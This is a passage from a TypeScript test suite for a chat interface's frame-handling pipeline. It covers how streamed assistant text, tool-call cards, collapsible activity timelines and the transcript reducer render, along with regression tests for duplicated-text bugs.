    //      streamRaw (NOT frame.message.text — that's the FULL multi-segment
    //      canonical text and using it would duplicate earlier segments).
    //   3. assistant-done refuses to finalize into a tool-call-card.
    //
    // These tests pin all three guarantees.
    it('Scenario: assistant-delta after a tool-call-card opens a fresh text bubble (does NOT overwrite the card)', () => {
      const { handleFrame, appendToolCallCard } = internals() as any
      const chat = document.getElementById('chat-messages')!
      chat.innerHTML = ''

      // Tool round-trip already happened.
      appendToolCallCard({
        type: 'tool-call', threadId: 't', turnId: 'turn-1', toolCallId: 'c1',
        name: 'Read', input: { path: '/etc/hosts' },
      })
      expect(chat.children.length).toBe(1)
      const timeline = chat.children[0] as HTMLElement
      expect(timeline.classList.contains('timeline')).toBe(true)
      // The tool card lives as a step inside the timeline; the <details><summary>
      // structure is the bug's tripwire (must NOT be overwritten by text).
      expect(timeline.querySelector('.tool-call-card details > summary')).not.toBeNull()

      handleFrame({
        type: 'assistant-delta', threadId: 't', turnId: 'turn-1',
        text: 'Here is what I found.',
      })

      // The timeline (with its card) is intact AND a fresh answer bubble appears
      // AFTER it for the post-tool text (the work never gets overwritten).
      expect(chat.children.length).toBe(2)
      expect((chat.children[0] as HTMLElement).classList.contains('timeline')).toBe(true)
      expect((chat.children[0] as HTMLElement).querySelector('.tool-call-card details > summary')).not.toBeNull()
      const fresh = chat.children[1] as HTMLElement
      expect(fresh.classList.contains('assistant')).toBe(true)
      expect(fresh.classList.contains('tool-call-card')).toBe(false)
      expect(fresh.dataset.streamRaw).toBe('Here is what I found.')
      // The answer bubble carries the turn id so it pairs with its turn.
      expect(fresh.dataset.turnId).toBe('turn-1')
    })

    it('Scenario: assistant-done after tool-call+text-stream finalizes with streamRaw (does NOT duplicate via frame.message.text)', () => {
      const { handleFrame, appendToolCallCard } = internals() as any
      const chat = document.getElementById('chat-messages')!
      chat.innerHTML = ''

      // Multi-segment turn: text-before-tool, then tool, then text-after-tool.
      // Pre-fix bug: assistant-done would write frame.message.text (= the
      // CONCATENATION of both text segments) into the post-tool bubble,
      // duplicating the pre-tool text on screen.
      handleFrame({ type: 'assistant-delta', threadId: 't', turnId: 'turn-1', text: 'Looking that up. ' })
      appendToolCallCard({
        type: 'tool-call', threadId: 't', turnId: 'turn-1', toolCallId: 'c1',
        name: 'Read', input: {},
      })
      handleFrame({ type: 'assistant-delta', threadId: 't', turnId: 'turn-1', text: 'Found 3 lines.' })

      // [timeline(pre-tool text + card), answer bubble] — 2 children.
      expect(chat.children.length).toBe(2)
      const answer = chat.children[1] as HTMLElement
      expect(answer.dataset.streamRaw).toBe('Found 3 lines.')

      // Server sends canonical FULL message text on assistant-done.
      handleFrame({
        type: 'assistant-done', threadId: 't', turnId: 'turn-1', seq: 1,
        message: {
          id: 'm1', role: 'assistant', seq: 1, createdAt: 0,
          text: 'Looking that up. Found 3 lines.',
          content: [
            { type: 'text', text: 'Looking that up. ' },
            { type: 'text', text: 'Found 3 lines.' },
          ],
        },
      })
      // The agentic turn fully ends (SDK `result`) → settles the run.
      handleFrame({ type: 'turn-complete', threadId: 't' })

      // Auto-collapses to the summary pill; the answer bubble stays below.
      expect(chat.children.length).toBe(2)
      const tl = chat.children[0] as HTMLElement
      expect(tl.classList.contains('timeline')).toBe(true)
      expect(tl.classList.contains('collapsed')).toBe(true)
      const answer2 = chat.children[1] as HTMLElement
      // The post-tool bubble shows ONLY "Found 3 lines." — NOT the full
      // canonical text "Looking that up. Found 3 lines." which would be the
      // duplication-bug fingerprint.
      expect(answer2.textContent?.trim()).toBe('Found 3 lines.')
      expect(answer2.textContent).not.toContain('Looking that up.')
      // The reducer split is the layout-independent dedup fingerprint.
      const segs = (internals() as any).ChatState.turns[0].segments
      expect(segs[0]).toMatchObject({ kind: 'text', raw: 'Looking that up. ' })
      expect(segs[1].kind).toBe('tool')
      expect(segs[2]).toMatchObject({ kind: 'text', raw: 'Found 3 lines.' })
    })

    it('Scenario: a turn that ends on a tool settles to the pill on turn-complete (no finalize-into-card)', () => {
      const { handleFrame, appendToolCallCard } = internals() as any
      const chat = document.getElementById('chat-messages')!
      chat.innerHTML = ''

      // Turn that ended on a tool with no trailing assistant text. doneMsg
      // would be the tool-call-card itself. Pre-fix, finalize would write
      // frame.message.text into the card, clobbering its structure.
      appendToolCallCard({
        type: 'tool-call', threadId: 't', turnId: 'turn-1', toolCallId: 'c1',
        name: 'Bash', input: { command: 'ls' },
      })
      expect(chat.children.length).toBe(1)
      const timeline = chat.children[0] as HTMLElement
      expect(timeline.classList.contains('timeline')).toBe(true)
      expect(timeline.querySelector('.tool-call-card details > summary')).not.toBeNull()

      handleFrame({
        type: 'assistant-done', threadId: 't', turnId: 'turn-1', seq: 1,
        message: {
          id: 'm1', role: 'assistant', seq: 1, createdAt: 0,
          text: 'Files: a, b, c.',
          content: [{ type: 'text', text: 'Files: a, b, c.' }],
        },
      })
      // Per-message done does NOT settle a tool-terminal turn — it's
      // indistinguishable from an intermediate step until `turn-complete`.
      expect((chat.children[0] as HTMLElement).classList.contains('collapsed')).toBe(false)

      // The SDK `result` lands → the run settles even though it ends on a tool.
      handleFrame({ type: 'turn-complete', threadId: 't' })

      // Settled: collapses to the pill (real "Worked for N steps", no spinner),
      // and the done message.text is written NOWHERE (no finalize-into-card,
      // no ghost answer bubble).
      expect(chat.children.length).toBe(1)
      const tl = chat.children[0] as HTMLElement
      expect(tl.classList.contains('timeline')).toBe(true)
      expect(tl.classList.contains('collapsed')).toBe(true)
      expect(tl.querySelector('.timeline-summary-label')!.textContent).toBe('Worked for 1 step')
      expect(tl.querySelector('.typing-dots')).toBeNull() // no perpetual spinner
      expect(chat.textContent).not.toContain('Files: a, b, c.')
      // Reducer kept just the tool segment (no spurious text segment).
      const segs = (internals() as any).ChatState.turns[0].segments
      expect(segs.length).toBe(1)
      expect(segs[0].kind).toBe('tool')
    })

    it('Scenario: pre-tool-call typing-dots/delta path still works (regression guard for the simple case)', () => {
      const { handleFrame } = internals() as any
      const chat = document.getElementById('chat-messages')!
      chat.innerHTML = ''
      const dots = document.createElement('div')
      dots.className = 'msg assistant'
      dots.innerHTML = '<div class="typing-dots"><div class="dot"></div></div>'
      chat.appendChild(dots)

      handleFrame({ type: 'assistant-delta', threadId: 't', turnId: 'x', text: 'Hello.' })
      handleFrame({
        type: 'assistant-done', threadId: 't', turnId: 'x', seq: 1,
        message: {
          id: 'm', role: 'assistant', seq: 1, createdAt: 0,
          text: 'Hello.',
          content: [{ type: 'text', text: 'Hello.' }],
        },
      })

      // Same single bubble; no tool-call-card so finalize uses
      // frame.message.text and the rendered text appears.
      expect(chat.children.length).toBe(1)
      const bubble = chat.children[0] as HTMLElement
      expect(bubble.querySelector('.typing-dots')).toBeNull()
      expect(bubble.classList.contains('tool-call-card')).toBe(false)
      expect(bubble.textContent).toContain('Hello.')
    })

    // ── Textarea auto-grow ────────────────────────────────────────────────
    it('Scenario: autoGrowMessageInput grows the textarea to fit multi-line content (jsdom-driven scrollHeight)', () => {
      const { autoGrowMessageInput } = internals() as any
      const ta = document.getElementById('message-input') as HTMLTextAreaElement
      expect(ta).not.toBeNull()
      // jsdom's scrollHeight is read-only and reflects the textarea's intrinsic
      // content size; we don't get real layout, so we monkey-patch a stable
      // scrollHeight to drive the helper. This exercises the clamp logic.
      Object.defineProperty(ta, 'scrollHeight', { configurable: true, get: () => 120 })
      autoGrowMessageInput()
      expect(ta.style.height).toBe('120px')
    })

    it('Scenario: autoGrowMessageInput clamps to the 320px max (long content scrolls inside)', () => {
      const { autoGrowMessageInput } = internals() as any
      const ta = document.getElementById('message-input') as HTMLTextAreaElement
      Object.defineProperty(ta, 'scrollHeight', { configurable: true, get: () => 999 })
      autoGrowMessageInput()
      expect(ta.style.height).toBe('320px')
    })

    it('Scenario: autoGrowMessageInput snaps to the 38px floor when content is short / empty', () => {
      const { autoGrowMessageInput } = internals() as any
      const ta = document.getElementById('message-input') as HTMLTextAreaElement
      Object.defineProperty(ta, 'scrollHeight', { configurable: true, get: () => 10 })
      autoGrowMessageInput()
      expect(ta.style.height).toBe('38px')
    })

    it('Scenario: typing into the textarea (input event) triggers auto-grow', () => {
      const ta = document.getElementById('message-input') as HTMLTextAreaElement
      // Drive autoGrow via the bound input event (proves the listener is wired).
      Object.defineProperty(ta, 'scrollHeight', { configurable: true, get: () => 85 })
      ta.value = 'line1\nline2\nline3'
      ta.dispatchEvent(new Event('input', { bubbles: true }))
      expect(ta.style.height).toBe('85px')
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: ChatState reducer (post-refactor data model)
  //
  // ChatState is the source-of-truth for the chat transcript. The renderer is
  // a pure function of state, so any bug-class involving "DOM and the streaming
  // buffer disagree" is captured here at the reducer level.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: ChatState reducer', () => {
    const state = () => (window as any).__MoonInternals.ChatState

    beforeEach(() => {
      state().reset()
    })

    it('reset() empties the transcript', () => {
      state().appendUser('hi', null)
      state().reset()
      expect(state().turns).toEqual([])
    })

    it('appendUser pushes a user turn with a done text segment', () => {
      state().appendUser('hello', null)
      const t = state().turns[0]
      expect(t.role).toBe('user')
      expect(t.status).toBe('done')
      expect(t.segments).toHaveLength(1)
      expect(t.segments[0]).toMatchObject({ kind: 'text', raw: 'hello', done: true })
    })

    it('appendBanner pushes an assistant banner turn (no streaming)', () => {
      state().appendBanner('New conversation')
      const t = state().turns[0]
      expect(t.role).toBe('assistant')
      expect(t.status).toBe('banner')
      expect(t.segments[0].raw).toBe('New conversation')
    })

    it('beginPendingAssistant followed by applyDelta upgrades the placeholder in place', () => {
      state().beginPendingAssistant()
      expect(state().turns[0].key).toBe('pending-assistant')
      state().applyDelta('turn-42', 'Hi')
      expect(state().turns).toHaveLength(1)
      expect(state().turns[0].key).toBe('t-turn-42')
      expect(state().turns[0].segments[0].raw).toBe('Hi')
    })

    it('applyDelta accumulates into a single text segment when nothing else has happened', () => {
      state().applyDelta('t1', 'Hello, ')
      state().applyDelta('t1', '**wor')
      state().applyDelta('t1', 'ld**!')
      const segs = state().turns[0].segments
      expect(segs).toHaveLength(1)
      expect(segs[0].raw).toBe('Hello, **world**!')
      expect(segs[0].done).toBe(false)
    })

    it('applyToolCall closes the open text segment so the next delta starts a fresh one', () => {
      state().applyDelta('t1', 'Looking up ')
      state().applyToolCall('t1', 'tc-1', 'bash', { cmd: 'ls' })
      state().applyDelta('t1', 'Found 3 lines.')
      const segs = state().turns[0].segments
      expect(segs.map((s: any) => s.kind)).toEqual(['text', 'tool', 'text'])
      expect(segs[0].raw).toBe('Looking up ')
      expect(segs[0].done).toBe(true)
      expect(segs[1]).toMatchObject({ kind: 'tool', id: 'tc-1', name: 'bash' })
      expect(segs[2].raw).toBe('Found 3 lines.')
    })

    it('applyToolResult pairs by toolCallId regardless of position', () => {
      state().applyToolCall('t1', 'tc-A', 'lsroot', {})
      state().applyToolCall('t1', 'tc-B', 'cat', {})
      state().applyToolResult('tc-B', true, 'second body', false)
      const segs = state().turns[0].segments
      expect(segs[0].result).toBeNull()
      expect(segs[1].result).toEqual({ ok: true, output: 'second body', truncated: false })
    })

    it('finishTurn marks the turn done and closes any open text segment', () => {
      state().applyDelta('t1', 'partial')
      state().finishTurn('t1', null)
      const t = state().turns[0]
      expect(t.status).toBe('done')
      expect(t.segments[0].done).toBe(true)
    })

    it('finishTurn drops a turn that produced no visible content (replaces sweep)', () => {
      state().beginPendingAssistant()
      state().finishTurn('t-missing', null)
      // pending placeholder gets finished and dropped (zero segments).
      expect(state().turns).toHaveLength(0)
    })

    it('failTurn surfaces an error turn even when no active turn was in flight', () => {
      state().failTurn(null, 'connection reset')
      const t = state().turns[0]
      expect(t.status).toBe('error')
      expect(t.errorText).toBe('connection reset')
    })

    it('dropPendingAssistant removes the watchdog placeholder', () => {
      state().beginPendingAssistant()
      const dropped = state().dropPendingAssistant()
      expect(dropped).toBe(true)
      expect(state().turns).toHaveLength(0)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: ChatRenderer + ChatLoop (end-to-end via __MoonInternals.handleFrame)
  //
  // These tests exercise the wire-frame -> reducer -> renderer pipeline that
  // production uses. They replace the older DOM-poke tests for the removed
  // sweepTrailingEmptyAssistantBubbles / isVisuallyEmpty helpers.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: end-to-end frame pipeline', () => {
    const M = () => (window as any).__MoonInternals
    let chat: HTMLElement

    beforeEach(() => {
      // Synchronous rAF so we observe each frame's effect immediately.
      ;(window as any).requestAnimationFrame = (cb: FrameRequestCallback) => { cb(0); return 1 }
      ;(window as any).cancelAnimationFrame = () => {}
      M().ChatState.reset()
      chat = document.getElementById('chat-messages') as HTMLElement
      chat.innerHTML = ''
    })

    it('thread-snapshot with messages renders one bubble per non-empty message', () => {
      M().handleFrame({
        type: 'thread-snapshot',
        messages: [
          { role: 'user', text: 'hi there' },
          { role: 'assistant', text: 'hello back' },
          { role: 'assistant', text: '   ' },                  // whitespace-only — skipped
        ],
      })
      expect(chat.children.length).toBe(2)
      expect(chat.children[0].className).toBe('msg user')
      expect(chat.children[1].className).toBe('msg assistant')
    })

    it('assistant-delta after a tool-call opens a fresh text bubble; the card is preserved', () => {
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Looking up ' })
      M().handleFrame({ type: 'tool-call', turnId: 't1', toolCallId: 'tc-1', name: 'bash', input: { cmd: 'ls' } })
      M().handleFrame({ type: 'tool-result', toolCallId: 'tc-1', status: 'ok', output: 'a\nb\n' })
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Found 2 lines.' })

      // Tool-using turn → ONE expanded timeline (the work) + the answer bubble.
      expect(chat.children.length).toBe(2)
      const timeline = chat.children[0] as HTMLElement
      expect(timeline.classList.contains('timeline')).toBe(true)
      expect(chat.children[1].className).toBe('msg assistant')

      // The tool card is a real <details><summary> step inside the timeline.
      const card = timeline.querySelector('.tool-call-card') as HTMLElement
      expect(card).not.toBeNull()
      expect(card.querySelector('details > summary')).not.toBeNull()
      expect(card.querySelector('.tool-card-status-ok')).not.toBeNull()
      expect(card.querySelector('.tool-card-output')!.textContent).toBe('a\nb\n')
      // The pre-tool interim text is a step in the timeline.
      expect(timeline.textContent).toContain('Looking up')

      // The trailing answer bubble has the right body.
      expect(chat.children[1].textContent).toContain('Found 2 lines.')
    })

    it('assistant-done with no preceding delta drops the empty placeholder (no ghost bubble)', () => {
      M().ChatState.beginPendingAssistant()
      M().ChatLoop.flush()
      expect(chat.querySelector('.typing-dots')).not.toBeNull()

      M().handleFrame({ type: 'assistant-done', turnId: 't1', message: { text: '' } })
      expect(chat.children.length).toBe(0)
    })

    it('assistant-done after streaming finalizes the text (markdown rendered) and clears typing dots', () => {
      M().ChatState.beginPendingAssistant()
      M().ChatLoop.flush()
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Hello **world**' })
      M().handleFrame({ type: 'assistant-done', turnId: 't1', message: { text: 'Hello **world**' } })

      expect(chat.querySelector('.typing-dots')).toBeNull()
      expect(chat.children.length).toBe(1)
      expect(chat.children[0].innerHTML).toContain('<strong>world</strong>')
    })

    it('assistant-error surfaces a visible error turn, clears typing dots', () => {
      M().ChatState.beginPendingAssistant()
      M().ChatLoop.flush()
      M().handleFrame({ type: 'assistant-error', turnId: 't1', error: { message: 'rate limited' } })
      expect(chat.querySelector('.typing-dots')).toBeNull()
      expect(chat.children.length).toBe(1)
      expect(chat.children[0].textContent).toContain('rate limited')
      expect(chat.children[0].className).toContain('error')
    })

    it('a delta that arrives empty does NOT pollute the transcript', () => {
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: '' })
      expect(M().ChatState.turns).toHaveLength(0)
      expect(chat.children.length).toBe(0)
    })

    // Regression: chat-service publishes the CUMULATIVE assistant text on
    // every `assistant-delta` (chat-service.ts:604 — `text: cumulative`).
    // ui-shared/reducer.ts mirrors that by REPLACING inFlight.text. The
    // pre-fix Moon reducer instead APPENDED frame.text to last.raw, which
    // duplicates the prefix on every delta after the first. Sterling
    // reported the visible artifact ("HeyHey Sterling — what's on the
    // agenda?") in luna-moon 0.0.10 on 2026-06-07; this scenario pins it.
    it('assistant-delta with cumulative text does NOT duplicate the prefix (HeyHey bug)', () => {
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Hey' })
      M().handleFrame({
        type: 'assistant-delta', turnId: 't1',
        text: "Hey Sterling — what's on the agenda?",
      })
      M().handleFrame({
        type: 'assistant-done', turnId: 't1',
        message: { text: "Hey Sterling — what's on the agenda?" },
      })

      expect(chat.children.length).toBe(1)
      const bubble = chat.children[0] as HTMLElement
      expect(bubble.dataset.streamRaw).toBe("Hey Sterling — what's on the agenda?")
      // The rendered text must NOT contain the duplicated prefix.
      expect(bubble.textContent).not.toContain('HeyHey')
      expect(bubble.textContent).toContain("Hey Sterling — what's on the agenda?")
    })

    it('many small cumulative deltas accumulate to the correct final text', () => {
      // 5 deltas, each cumulative-up-to-N. Pre-fix this exploded to
      // "HHeHelHellHello world" — cascading duplication.
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'H' })
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'He' })
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Hel' })
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Hell' })
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Hello world' })
      expect(chat.children.length).toBe(1)
      expect((chat.children[0] as HTMLElement).dataset.streamRaw).toBe('Hello world')
    })

    it('cumulative deltas spanning a tool call do NOT replay the pre-tool text in the post-tool bubble', () => {
      // Server cumulative continues to grow across tool calls — chat-service
      // only resets inFlightText when the final `assistant` SDK message
      // lands. So the post-tool delta's cumulative includes the pre-tool
      // prefix. We must subtract that prefix before opening the fresh text
      // segment, otherwise the user sees "Looking that up. Found 3 lines."
      // in the post-tool bubble (duplicating the pre-tool text bubble).
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Looking that up. ' })
      M().handleFrame({ type: 'tool-call', turnId: 't1', toolCallId: 'tc-1', name: 'bash', input: { cmd: 'ls' } })
      M().handleFrame({ type: 'tool-result', toolCallId: 'tc-1', status: 'ok', output: 'a\n' })
      M().handleFrame({
        type: 'assistant-delta', turnId: 't1',
        // CUMULATIVE: pre-tool + post-tool text.
        text: 'Looking that up. Found 3 lines.',
      })

      // [timeline(pre-tool text step + card), answer bubble] — 2 children.
      expect(chat.children.length).toBe(2)
      const timeline = chat.children[0] as HTMLElement
      expect(timeline.classList.contains('timeline')).toBe(true)
      const post = chat.children[1] as HTMLElement
      // The pre-tool interim text step keeps ONLY its own segment...
      const preStep = timeline.querySelector('.timeline-step-text') as HTMLElement
      expect(preStep.dataset.streamRaw).toBe('Looking that up. ')
      expect(timeline.querySelector('.tool-call-card')).not.toBeNull()
      // ...and the post-tool answer bubble shows the INCREMENTAL suffix only.
      expect(post.dataset.streamRaw).toBe('Found 3 lines.')
      // The reducer split is the layout-independent dedup fingerprint.
      const segs = M().ChatState.turns[0].segments
      expect(segs[0].raw).toBe('Looking that up. ')
      expect(segs[2].raw).toBe('Found 3 lines.')
    })

    it('finishTurn with an empty server message text does NOT wipe streamed content', () => {
      // Regression for the "??" foot-gun. Server sometimes sends
      // `message.text === ""` on assistant-done; the renderer must still show
      // the segments accumulated from the delta stream.
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'streamed answer' })
      M().handleFrame({ type: 'assistant-done', turnId: 't1', message: { text: '' } })
      expect(chat.children.length).toBe(1)
      expect(chat.children[0].textContent).toContain('streamed answer')
    })

    // ── Activity timeline (Gemini-style collapsible progress) ─────────────────

    it('timeline: a pure-text turn (no tool) renders a plain bubble, no timeline', () => {
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Just a plain answer.' })
      M().handleFrame({ type: 'assistant-done', turnId: 't1', message: { text: 'Just a plain answer.' } })
      expect(chat.children.length).toBe(1)
      expect(chat.querySelector('.timeline')).toBeNull();
      expect(chat.children[0].className).toBe('msg assistant')
      expect(chat.children[0].textContent).toContain('Just a plain answer.')
    })

    it('timeline: interim text + a tool become steps in ONE expanded timeline while streaming', () => {
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Looking that up. ' })
      M().handleFrame({ type: 'tool-call', turnId: 't1', toolCallId: 'tc-1', name: 'Google Search', input: { q: 'x' } })
      M().handleFrame({ type: 'tool-result', toolCallId: 'tc-1', status: 'ok', output: 'done' })

      expect(chat.children.length).toBe(1)
      const tl = chat.children[0] as HTMLElement
      expect(tl.classList.contains('timeline')).toBe(true)
      expect(tl.classList.contains('collapsed')).toBe(false) // expanded while streaming
      expect((tl.querySelector('.timeline-step-text') as HTMLElement).textContent).toContain('Looking that up.')
      expect(tl.querySelector('.tool-call-card .tool-card-name')!.textContent).toBe('Google Search')
      expect(tl.querySelector('.timeline-summary-label')!.textContent).toContain('Working on it')
    })

    it('timeline: on turn-complete, collapses to a summary pill with the answer bubble below', () => {
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Checking. ' })
      M().handleFrame({ type: 'tool-call', turnId: 't1', toolCallId: 'tc-1', name: 'Read', input: {} })
      M().handleFrame({ type: 'tool-result', toolCallId: 'tc-1', status: 'ok', output: 'x' })
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Found 2 lines.' })
      M().handleFrame({ type: 'assistant-done', turnId: 't1', message: { text: 'Checking. Found 2 lines.' } })
      M().handleFrame({ type: 'turn-complete', threadId: 't1' })

      expect(chat.children.length).toBe(2)
      const tl = chat.children[0] as HTMLElement
      expect(tl.classList.contains('timeline')).toBe(true)
      expect(tl.classList.contains('collapsed')).toBe(true)
      expect(tl.querySelector('.timeline-body')).toBeNull() // collapsed = body hidden
      const answer = chat.children[1] as HTMLElement
      expect(answer.className).toBe('msg assistant')
      expect(answer.textContent).toContain('Found 2 lines.')
    })

    it('timeline: auto-collapses only on turn-complete (per-message done does NOT); shows the work-step count', () => {
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'one ' })
      M().handleFrame({ type: 'tool-call', turnId: 't1', toolCallId: 'a', name: 'Read', input: {} })
      M().handleFrame({ type: 'tool-result', toolCallId: 'a', status: 'ok', output: 'r' })
      expect((chat.querySelector('.timeline') as HTMLElement).classList.contains('collapsed')).toBe(false)

      // Per-message `assistant-done` must NOT collapse — in a multi-step turn it
      // fires once per step and can't tell an intermediate step from the final
      // answer. Collapsing here would hide running work between steps.
      M().handleFrame({ type: 'assistant-done', turnId: 't1', message: { text: 'one' } })
      expect((chat.querySelector('.timeline') as HTMLElement).classList.contains('collapsed')).toBe(false)
      expect((chat.querySelector('.timeline-summary-label') as HTMLElement).textContent).toContain('Working on it')

      // Only the whole-turn `turn-complete` settles it.
      M().handleFrame({ type: 'turn-complete', threadId: 't1' })
      const tl = chat.querySelector('.timeline') as HTMLElement
      expect(tl.classList.contains('collapsed')).toBe(true)
      // Work = [text 'one ', tool] = 2 steps.
      expect(tl.querySelector('.timeline-summary-label')!.textContent).toBe('Worked for 2 steps')
    })

    it('timeline: clicking the summary toggles collapse', () => {
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'go ' })
      M().handleFrame({ type: 'tool-call', turnId: 't1', toolCallId: 'a', name: 'Read', input: {} })
      M().handleFrame({ type: 'tool-result', toolCallId: 'a', status: 'ok', output: 'r' })
      M().handleFrame({ type: 'assistant-done', turnId: 't1', message: { text: 'go' } })
      M().handleFrame({ type: 'turn-complete', threadId: 't1' }) // settle → starts collapsed

      const click = () => (chat.querySelector('.timeline-summary') as HTMLElement)
        .dispatchEvent(new MouseEvent('click', { bubbles: true }))
      expect((chat.querySelector('.timeline') as HTMLElement).classList.contains('collapsed')).toBe(true)
      click()
      expect((chat.querySelector('.timeline') as HTMLElement).classList.contains('collapsed')).toBe(false)
      expect(chat.querySelector('.timeline-body')).not.toBeNull()
      click()
      expect((chat.querySelector('.timeline') as HTMLElement).classList.contains('collapsed')).toBe(true)
    })

    it('timeline: a user-set collapse survives a later streaming re-render (state lives on the turn)', () => {
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'start ' })
      M().handleFrame({ type: 'tool-call', turnId: 't1', toolCallId: 'a', name: 'Read', input: {} })
      // Streaming + expanded; the user collapses it.
      expect((chat.querySelector('.timeline') as HTMLElement).classList.contains('collapsed')).toBe(false)
      ;(chat.querySelector('.timeline-summary') as HTMLElement).dispatchEvent(new MouseEvent('click', { bubbles: true }))
      expect((chat.querySelector('.timeline') as HTMLElement).classList.contains('collapsed')).toBe(true)

      // A later frame re-renders the timeline — it MUST stay collapsed because
      // the flag lives on the turn, not the rebuilt DOM. (The core gotcha.)
      M().handleFrame({ type: 'tool-result', toolCallId: 'a', status: 'ok', output: 'r' })
      M().handleFrame({ type: 'tool-call', turnId: 't1', toolCallId: 'b', name: 'Bash', input: {} })
      expect((chat.querySelector('.timeline') as HTMLElement).classList.contains('collapsed')).toBe(true)
    })

    it('timeline: an error mid-work surfaces the error turn (v1 replaces the timeline)', () => {
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'trying ' })
      M().handleFrame({ type: 'tool-call', turnId: 't1', toolCallId: 'a', name: 'Read', input: {} })
      M().handleFrame({ type: 'assistant-error', turnId: 't1', error: { message: 'boom' } })
      expect(chat.children.length).toBe(1)
      expect(chat.children[0].className).toContain('error')
      expect(chat.children[0].textContent).toContain('boom')
      expect(chat.querySelector('.timeline')).toBeNull()
    })

    // ── Multi-step agentic-turn GROUPING (the user-reported bug) ──────────────
    // An agentic turn is N SDK assistant messages, each with its OWN wire
    // turnId (the server resets the in-flight turn id per assistant message).
    // They MUST render as ONE collapsible timeline, not N stacked timelines.

    it('timeline: a multi-step turn with DISTINCT turnIds renders exactly ONE timeline', () => {
      // Frame order mirrors the reordered server: tool-call BEFORE done.
      // Step 1 (turnId A): think → tool → done → result.
      M().handleFrame({ type: 'assistant-delta', turnId: 'A', text: 'Step one. ' })
      M().handleFrame({ type: 'tool-call', turnId: 'A', toolCallId: 'a', name: 'Read', input: {} })
      M().handleFrame({ type: 'assistant-done', turnId: 'A', message: { text: 'Step one.' } })
      M().handleFrame({ type: 'tool-result', toolCallId: 'a', status: 'ok', output: 'ra' })
      // Step 2 (turnId B): a DIFFERENT turn id.
      M().handleFrame({ type: 'assistant-delta', turnId: 'B', text: 'Step two. ' })
      M().handleFrame({ type: 'tool-call', turnId: 'B', toolCallId: 'b', name: 'Bash', input: {} })
      M().handleFrame({ type: 'assistant-done', turnId: 'B', message: { text: 'Step two.' } })
      M().handleFrame({ type: 'tool-result', toolCallId: 'b', status: 'ok', output: 'rb' })
      // Final answer (turnId C): pure text, no tool.
      M().handleFrame({ type: 'assistant-delta', turnId: 'C', text: 'All done.' })
      M().handleFrame({ type: 'assistant-done', turnId: 'C', message: { text: 'All done.' } })

      // THE fix: ONE timeline grouping all three turns' work, not three.
      // (Asserted while still expanded — a collapsed timeline hides its body.)
      expect(chat.querySelectorAll('.timeline').length).toBe(1)
      let tl = chat.querySelector('.timeline') as HTMLElement
      expect(tl.classList.contains('collapsed')).toBe(false)
      // Both tools are steps inside the single timeline.
      expect(tl.querySelectorAll('.tool-call-card').length).toBe(2)

      // The whole turn ends → settle → collapse.
      M().handleFrame({ type: 'turn-complete', threadId: 't1' })
      expect(chat.querySelectorAll('.timeline').length).toBe(1)
      tl = chat.querySelector('.timeline') as HTMLElement
      expect(tl.classList.contains('collapsed')).toBe(true)
      // Work = [textA, toolA, textB, toolB] = 4 steps.
      expect(tl.querySelector('.timeline-summary-label')!.textContent).toBe('Worked for 4 steps')
      // The final answer is the bubble below the pill.
      const answer = chat.children[chat.children.length - 1] as HTMLElement
      expect(answer.className).toBe('msg assistant')
      expect(answer.textContent).toContain('All done.')
    })

    it('timeline: an intermediate per-message done across turnIds stays EXPANDED (no flicker)', () => {
      // Step 1 ends (turnId A, ends on a tool) — but the agentic turn is NOT
      // over (no turn-complete yet). The single timeline must stay expanded so
      // running work between steps is never hidden.
      M().handleFrame({ type: 'assistant-delta', turnId: 'A', text: 'Looking. ' })
      M().handleFrame({ type: 'tool-call', turnId: 'A', toolCallId: 'a', name: 'Read', input: {} })
      M().handleFrame({ type: 'assistant-done', turnId: 'A', message: { text: 'Looking.' } })
      M().handleFrame({ type: 'tool-result', toolCallId: 'a', status: 'ok', output: 'ra' })

      expect(chat.querySelectorAll('.timeline').length).toBe(1)
      const tl = chat.querySelector('.timeline') as HTMLElement
      expect(tl.classList.contains('collapsed')).toBe(false)
      expect(tl.querySelector('.timeline-summary-label')!.textContent).toContain('Working on it')
      expect(tl.querySelector('.typing-dots')).not.toBeNull() // still in flight

      // Step 2 begins under a new turnId — still ONE timeline, still expanded.
      M().handleFrame({ type: 'assistant-delta', turnId: 'B', text: 'More. ' })
      M().handleFrame({ type: 'tool-call', turnId: 'B', toolCallId: 'b', name: 'Bash', input: {} })
      expect(chat.querySelectorAll('.timeline').length).toBe(1)
      expect((chat.querySelector('.timeline') as HTMLElement).classList.contains('collapsed')).toBe(false)
    })

    it('timeline: a new user message starts a fresh run (does NOT merge into the prior turn)', () => {
      // First agentic turn (tool + settle).
      M().handleFrame({ type: 'assistant-delta', turnId: 'A', text: 'First. ' })
      M().handleFrame({ type: 'tool-call', turnId: 'A', toolCallId: 'a', name: 'Read', input: {} })
      M().handleFrame({ type: 'assistant-done', turnId: 'A', message: { text: 'First.' } })
      M().handleFrame({ type: 'turn-complete', threadId: 't1' })
      // A user turn is the run boundary.
      M().ChatState.appendUser('next question')
      M().ChatLoop.flush()
      // Second agentic turn (tool, still in flight).
      M().handleFrame({ type: 'assistant-delta', turnId: 'B', text: 'Second. ' })
